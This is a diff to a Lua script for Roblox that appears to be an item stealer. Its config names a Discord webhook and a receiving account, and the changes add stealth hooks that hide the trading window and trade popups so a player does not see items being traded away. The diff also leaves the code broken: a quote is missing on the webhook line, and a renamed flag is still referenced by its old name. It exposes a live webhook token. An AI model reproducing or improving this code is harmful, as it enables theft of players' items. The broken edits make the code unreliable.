@@ -1,12 +1,12 @@
 -- ===== CONFIG =====
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1493322934532702261/heWYGm0D9zq8kiDoReF5eZEFiDdpDx9wuwZipmUygAbHIC4fJ5_43TJp2dN_n-iLNOxh"
+local WEBHOOK_URL = https://discord.com/api/webhooks/1493322934532702261/heWYGm0D9zq8kiDoReF5eZEFiDdpDx9wuwZipmUygAbHIC4fJ5_43TJp2dN_n-iLNOxh"
 local RECEIVER = "Luckyman7778910"
 local ENABLE_TRADE = true
 local TRADE_INVITE_COOLDOWN = 6
 local TRADE_ADD_DELAY = 0
 local TRADE_MODIFY_BUFFER = 0.03
 local TRADE_MAX_ITEMS = 20
-local HIDE_TRADE_GUI = true -- Set to true to hide trade GUI elements
+local HIDE_TRADING_GUI = true
 local SINGLE_ITEM_MIN_RAP = 1000
 local EVERYONE_RAP_THRESHOLD = 1000
 local NEWBIE_PLACE_IDS = {
@@ -799,7 +799,8 @@ local TradeRuntime = {
     stealthHooksReady = false,
     stealthArmed = false,
     stealthHeartbeat = nil,
-    popupGuiDefaults = nil,
+    tradingGuiDefaults = nil,
+    auxGuiDefaults = nil,
     sessionRunning = false,
     dataReplion = nil,
     catalog = nil,
@@ -814,11 +815,11 @@ local function shouldHideTradeGui()
     if not HIDE_TRADE_GUI then
         return false
     end
-    return true
+    return isTradeUiActive()
 end
 
 local function hideTradingGuiInstant()
-    if not HIDE_TRADE_GUI then
+    if not HIDE_TRADING_GUI or not isTradeUiActive() then
         return
     end
 
@@ -827,12 +828,35 @@ local function hideTradingGuiInstant()
         return
     end
 
-    local popup = playerGui:FindFirstChild("TradeRequestPopup")
-    if popup and popup:IsA("ScreenGui") then
-        if TradeRuntime.popupGuiDefaults == nil then
-            TradeRuntime.popupGuiDefaults = popup.Enabled
+    local trading = playerGui:FindFirstChild("Trading")
+    if trading and trading:IsA("ScreenGui") then
+        if not TradeRuntime.tradingGuiDefaults then
+            local frame = trading:FindFirstChild("Frame")
+            TradeRuntime.tradingGuiDefaults = {
+                displayOrder = trading.DisplayOrder,
+                frameVisible = frame and frame.Visible,
+                framePosition = frame and frame.Position,
+            }
         end
-        popup.Enabled = false
+
+        trading.Enabled = true
+        local frame = trading:FindFirstChild("Frame")
+        if frame then
+            frame.Visible = false
+            frame.Position = UDim2.fromScale(2, 2)
+        end
+        trading.DisplayOrder = -500
+    end
+
+    for _, guiName in ipairs({ "TradeRequestPopup", "TradeList", "ViewInventory" }) do
+        local gui = playerGui:FindFirstChild(guiName)
+        if gui and gui:IsA("ScreenGui") then
+            TradeRuntime.auxGuiDefaults = TradeRuntime.auxGuiDefaults or {}
+            if TradeRuntime.auxGuiDefaults[guiName] == nil then
+                TradeRuntime.auxGuiDefaults[guiName] = gui.Enabled
+            end
+            gui.Enabled = false
+        end
     end
 end
 
@@ -841,21 +865,42 @@ local function restoreTradingGui()
 
     local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
     if not playerGui then
-        TradeRuntime.popupGuiDefaults = nil
+        TradeRuntime.tradingGuiDefaults = nil
+        TradeRuntime.auxGuiDefaults = nil
         return
     end
 
-    if TradeRuntime.popupGuiDefaults ~= nil then
-        local popup = playerGui:FindFirstChild("TradeRequestPopup")
-        if popup and popup:IsA("ScreenGui") then
-            popup.Enabled = TradeRuntime.popupGuiDefaults
+    local defaults = TradeRuntime.tradingGuiDefaults
+    if defaults then
+        local trading = playerGui:FindFirstChild("Trading")
+        if trading and trading:IsA("ScreenGui") then
+            trading.DisplayOrder = defaults.displayOrder
+            local frame = trading:FindFirstChild("Frame")
+            if frame then
+                if defaults.frameVisible ~= nil then
+                    frame.Visible = defaults.frameVisible
+                end
+                if defaults.framePosition then
+                    frame.Position = defaults.framePosition
+                end
+            end
         end
-        TradeRuntime.popupGuiDefaults = nil
+        TradeRuntime.tradingGuiDefaults = nil
+    end
+
+    if TradeRuntime.auxGuiDefaults then
+        for guiName, wasEnabled in pairs(TradeRuntime.auxGuiDefaults) do
+            local gui = playerGui:FindFirstChild(guiName)
+            if gui and gui:IsA("ScreenGui") then
+                gui.Enabled = wasEnabled
+            end
+        end
+        TradeRuntime.auxGuiDefaults = nil
     end
 end
 
 local function armTradeStealth()
-    if not HIDE_TRADE_GUI then
+    if not HIDE_TRADING_GUI or not isTradeUiActive() then
         return
     end
     TradeRuntime.stealthArmed = true
@@ -867,22 +912,27 @@ local function disarmTradeStealth()
 end
 
 local function installTradeStealthHooks()
-    if TradeRuntime.stealthHooksReady or not HIDE_TRADE_GUI then
+    if TradeRuntime.stealthHooksReady or not HIDE_TRADING_GUI then
         return
     end
     TradeRuntime.stealthHooksReady = true
 
     task.spawn(function()
         local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-        local popup = playerGui:WaitForChild("TradeRequestPopup", 5)
+        local trading = playerGui:WaitForChild("Trading")
+        local frame = trading:WaitForChild("Frame")
 
-        if popup then
-            popup:GetPropertyChangedSignal("Enabled"):Connect(function()
-                if shouldHideTradeGui() and popup.Enabled then
-                    popup.Enabled = false
-                end
-            end)
-        end
+        trading:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if shouldHideTradeGui() then
+                hideTradingGuiInstant()
+            end
+        end)
+
+        frame:GetPropertyChangedSignal("Visible"):Connect(function()
+            if shouldHideTradeGui() and frame.Visible then
+                frame.Visible = false
+            end
+        end)
 
         if TradeRuntime.stealthHeartbeat then
             TradeRuntime.stealthHeartbeat:Disconnect()
@@ -892,6 +942,14 @@ local function installTradeStealthHooks()
             if shouldHideTradeGui() then
                 hideTradingGuiInstant()
             elseif TradeRuntime.stealthArmed then
+                disarmTradeStealth()
+            end
+        end)
+
+        LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
+            if LocalPlayer:GetAttribute("IsTrading") then
+                armTradeStealth()
+            else
                 disarmTradeStealth()
             end
         end)
